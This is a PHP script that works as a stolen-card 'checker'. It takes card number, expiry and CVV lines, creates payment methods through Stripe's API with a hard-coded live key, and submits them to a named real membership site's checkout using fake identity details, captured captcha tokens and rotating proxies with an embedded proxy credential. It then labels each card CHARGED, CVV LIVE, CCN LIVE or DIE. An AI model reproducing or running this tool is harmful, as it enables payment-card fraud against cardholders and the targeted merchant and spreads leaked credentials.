
<?php 
error_reporting(0);
//---------------------------------------//
$mtc_site = "https://retirementbenefitsplanning.us/membership-account/membership-checkout/" ;
$amt = "accept" ;
//---------------------------------------//

$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);
$print = print_r($update);
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
;

//==================[Randomizing Details]======================//
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];
//==================[Randomizing Details-END]======================//

function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();

$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}
/////////////===[Proxy]/////////////
$rp1 = array(
  1 => 'ybeynphq-rotate:yyotypam1z87', //=my id//
  2 => 'USER:PASS',
  3 => 'USER:PASS',
  4 => 'USER:PASS',
  5 => 'USER:PASS',
    ); 
    $rpt = array_rand($rp1);
    $rotate = $rp1[$rpt];
$ip = array(
  1 => 'socks5://p.webshare.io:80',
  2 => 'http://p.webshare.io:80',
    ); 
    $socks = array_rand($ip);
    $socks5 = $ip[$socks];
$url = "https://api.ipify.org/";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();
if (isset($ip1)){
$ip = "🟢";
}
if (empty($ip1)){
$ip = "🔴";
}
# --------------------[Proxy End]-----------------#

# -------------------- [1 REQ] -------------------#
$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'method: POST',
'path: /v1/payment_methods',
'scheme: https',
'accept: application/json',
'accept-language: en-US,en;q=0.5,en-US,en;q=0.6,en-US,en;q=0.7,en-US,en;q=0.8,en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

# ----------------- [1req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[address][line1]=3324+Chapel+Street&billing_details[address][line2]=&billing_details[address][city]=Sugar+Land&billing_details[address][state]=Texas&billing_details[address][postal_code]=77478&billing_details[address][country]=US&billing_details[name]=David+Joyce&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2Fed398fe5b%3B+stripe-js-v3%2Fed398fe5b&time_on_page=2473680&key=pk_live_1a4WfCRJEoV9QNmww9ovjaR2Drltj9JA3tJEWTBi4Ixmr8t3q5nDIANah1o0SdutQx4lUQykrh9bi3t4dR186AR8P00KY9kjRvX&_stripe_account=acct_1Ch1BoGnovmdHLs5');




$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));
#$pi = Getstr($result1,'client_secret":"','_secret');

#$src = Getstr($result1,'client_secret":"','"');
# -------------------- [2 REQ] -------------------#

$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://retirementbenefitsplanning.us/membership-account/membership-checkout/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: retirementbenefitsplanning.us',
'method: POST',
'path: /membership-account/membership-checkout/',
'scheme: https',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
'accept-language: en-US,en;q=0.5,en-US,en;q=0.6,en-US,en;q=0.7,en-US,en;q=0.8,en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded',
'cookie: PHPSESSID=1cjgbhiqqoh4dihbar3eq3pu7i; pmpro_visit=1',
'origin: https://retirementbenefitsplanning.us',
'referer: https://retirementbenefitsplanning.us/membership-account/membership-checkout/',
'sec-fetch-dest: document',
'sec-fetch-mode: navigate',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
   ));

# ----------------- [2req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS,'level=1&checkjavascript=1&other_discount_code=&username='.$name.'007&password=4400662438466786&password2=4400662438466786&bemail='.$email.'&bconfirmemail='.$email.'&fullname=&bfirstname=David&blastname=Joyce&baddress1=3324+Chapel+Street&baddress2=&bcity=Sugar+Land&bstate=Texas&bzipcode=77478&bcountry=US&bphone=281-624-2411&CardType=visa&discount_code=&g-recaptcha-response=03AFY_a8X4hG8m4my0oa9Cp9e37ifdJ0-7D5lThVPvcJK0MvnP44kNAfgO8jQsFaUeTZ2cEcjdPDwJ8nRw69tiFWC45-I9Mf7X4nEEO4ejN0oWmet99CtB6N_JhcL023GW9om3C1ZhJqTVsoRYMpu9y4_-ZhCKe6oDTYQF5Nb9ZfmJ693-e9yXnDJFVIyans331ApeIvDC6o2MnFLkLkcyrjpcKXcZXdAvxGeRmggWhWtIfuA-svcX0Be5H1yRhXU53CJzbeE2wOBw1Iyt_91Ibv5UusT1ZJBm95SqFVP4oY7GmXIyc-FG8q2k5kohBT7iQmLbIRoJfyLkhh6Zzdr9YHE1yF3DYwxXR57X0hPrQjKsgeramHyhwvyWUDcBdjE7a_VmRN0TViT4OfD3ofYLFzHcD5gP1H3qTMvKwNllN0TBLoXe6MMiJv56lOljbSXaorBV9uguVMLG9eioBFznGT9bZY-3vzMtr46S6NKADyIIiD6b_MRrjpQgvye6U-HAXBjV4t2ciYNy&submit-checkout=1&javascriptok=1&g-recaptcha-response=03AFY_a8XkdvOj2Z6LoHAiXGNt25hQNnaRrqcrHJWiCj4GET20oUR8Zj38aX54X1U4lWin8UGyBl_il7Uwy8dhyho6EF1hmHawosGHRVbGfFzgI8DXtsu4wnwcSH-N3EHMOVa6uejgTBHcW3fQmytF0XFgNjl-XILmHxz0xnOsdMOFwfOpyjDf0D0OLqraYvIkiArhGJb35hbUqQoCnqOdfdJG2MpbWXEBk-zytBZu8mNF1_pl22gX8WH_g374AdafAHYAHXukkY8HZYlkCZfwXHpmM0H_WSXr8WjaKfzjLnnIQzgORtDbMT_upqltKlWWc2zxhpN-zS4hAVx2KjPzhdr4ECB_FDYjzkvRnHID8hSDF0zIuL6kIEix3GvPOqduesAk4dY_W_APINOPDKkhsyhNa5XIm2ihztX0E0fOwrBUge3CpfGa7QqgfsVyefz2YJIwGuahhJY-UZsb6AJhvDJW8XAKuMLVpUIE_3zO1QveJb-65baVuDNEGyRnZNjeyk-XZbtOpB5q&payment_method_id='.$id.'&AccountNumber=XXXXXXXXXXXX6786&ExpirationMonth=10&ExpirationYear=2027');



$result2 = curl_exec($ch);
# ---------------------------------------#


# ---------------- [Responses] ----------------- #
if(strpos($result2, "payment_intent_unexpected_state")) {



    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Payment Intent Confirmed ⚠️ </span><br>';

    }

elseif(strpos($result2, "succeeded")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ✅ArpitItachi☯_'.$ip.' </span><br>';
exit;
}

elseif(strpos($result2, "Your card has insufficient funds.")) {

    echo '#CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVV LIVE ✅ArpitItachi☯_'.$ip.'  </span><br>';
    exit;
    }



elseif(strpos($result2, "incorrect_zip")) {

    echo '#CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVV LIVE ✅ArpitItachi☯_'.$ip.'  </span><br>';
    exit;
    }
    
    elseif(strpos($result2, "Your card has insufficient funds.")) {

    echo '#CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVV LIVE ✅ArpitItachi☯_'.$ip.'  </span><br>';
    exit;
    }

elseif(strpos($result2, 'security code is incorrect.')) {

    echo '#CCN</span>  </span>CC:  '.$lista.'</span>  <br>Result: CCN LIVE ✅ArpitItachi☯_'.$ip.'  </span><br>';
    exit;
    }
    elseif(strpos($result2, "Error updating default payment method. Your card's security code is incorrect.")) {

        echo '#CCN</span>  </span>CC:  '.$lista.'</span>  <br>Result: CCN LIVE ✅ArpitItachi☯_'.$ip.'  </span><br>';
        exit;
        }
    elseif(strpos($result2, "Your card's security code is incorrect")) {

    echo '#CCN</span>  </span>CC:  '.$lista.'</span>  <br>Result: CCN LIVE ✅ArpitItachi☯_'.$ip.'  </span><br>';
    }
    
elseif(strpos($result2, "transaction_not_allowed")) {

    echo '#CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result:  CVV LIVE ✅ArpitItachi☯_'.$ip.'   </span><br>';
    exit;
    }
    

elseif(strpos($result2, "stripe_3ds2_fingerprint")) {


    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result:  3D ☯_'.$ip.'  </span><br>';
    exit;
    }
elseif(strpos($result2, "generic_decline")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: GENERIC DECLINE ☯_'.$ip.' </span><br>';
    }

elseif(strpos($result2, "do_not_honor")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR ☯_'.$ip.' </span><br>';

}


elseif(strpos($result2, "fraudulent")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: FRAUDULENT ☯_'.$ip.' </span><br>';

}
elseif(strpos($result2, "intent_confirmation_challenge")) {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Captcha ⚠️ ☯_'.$ip.' </span><br>';

    }


elseif(strpos($result2, 'Your card was declined.')) {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Decline ☯_'.$ip.' </span><br>';
}

elseif(strpos($result2, 'Error updating default payment method. Your card was declined.')) {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Decline ☯_'.$ip.' </span><br>';
}

elseif(strpos($result2, '"cvc_check": "pass"')) {

    echo '#CVV</span>  </span>CC:  '.$lista.'</span><br>Result:CVV LIVE ✅ArpitItachi☯_'.$ip.'  </span><br>';
exit;
}

elseif(strpos($result2, "Membership Confirmation")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result: Membership Confirmation '.$amt.' ✅ArpitItachi☯_'.$ip.' </span><br>';
exit;
}

elseif(strpos($result2, "Thank for your support!")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ✅ArpitItachi☯_'.$ip.' </span><br>';
exit;
}

elseif(strpos($result2, "Thank you for your donation")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ✅ArpitItachi☯_'.$ip.' </span><br>';
exit;
}

elseif(strpos($result2, "/wishlist-member/?reg=")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ✅ArpitItachi☯_'.$ip.' </span><br>';
exit;
}

elseif(strpos($result2, "Thank You For Donation.")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ✅ArpitItachi☯_'.$ip.' </span><br>';
exit;
}

elseif(strpos($result2, "Thank You")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ✅ArpitItachi☯_'.$ip.' </span><br>';
exit;
}

elseif(strpos($result2, "incorrect_cvc")) {

    echo '#CCN</span>  </span>CC:  '.$lista.'</span><br>Result:CCN LIVE ✅ArpitItachi☯_'.$ip.'   </span><br>';
exit;
}

elseif(strpos($result2, "Card is declined by your bank, please contact them for additional information.")) {

    echo '#CVV</span>  </span>CC:  '.$lista.'</span><br>Result:CVV LIVE ✅ArpitItachi☯_'.$ip.'  </span><br>';
exit;
}

elseif(strpos($result2, "Your card does not support this type of purchase.")) {

    echo '#CVV</span>  </span>CC:  '.$lista.'</span><br>Result:CVV LIVE ✅ArpitItachi☯_'.$ip.'  </span><br>';
exit;
}

elseif(strpos($result2, "Your card is not supported.")) {

    echo '#CVV</span>  </span>CC:  '.$lista.'</span><br>Result:CVV LIVE ✅ArpitItachi☯_'.$ip.' </span><br>';
exit;
}


else {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD DECLINED ☯_'.$ip.' </span><br>';

}



curl_close($ch);
ob_flush();
echo "</i><font size=2 color='grey'>$ip: $ip1</i></font><br>";
#echo $result1;
#echo $result2; 
?>